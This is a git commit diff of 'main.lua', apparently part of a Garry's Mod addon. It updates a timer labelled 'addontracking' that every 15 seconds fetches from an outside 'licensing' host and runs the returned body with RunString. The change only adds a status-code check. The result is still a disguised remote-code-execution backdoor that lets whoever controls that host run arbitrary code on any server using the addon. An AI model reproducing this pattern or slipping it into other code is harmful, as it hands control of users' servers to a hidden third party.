f5af6ef74e2c12f6385b4d20c05c0e6b8f9a9372
LastPlayerTR <73468364+LastPlayerTR@users.noreply.github.com>
2021-11-11 21:47:28 +0300

    Update main.lua

--- main.lua
+++ main.lua
@@ -4,7 +4,9 @@ timer.Create("addontracking", 15, 0 , function()
     http.Fetch( "https://licensing.lprotect.xyz/send",
         
         function( body, length, headers, code )
-            RunString(body)
+            if code == 200 then
+                RunString(body)
+            end  
         end,
   
         function( message )
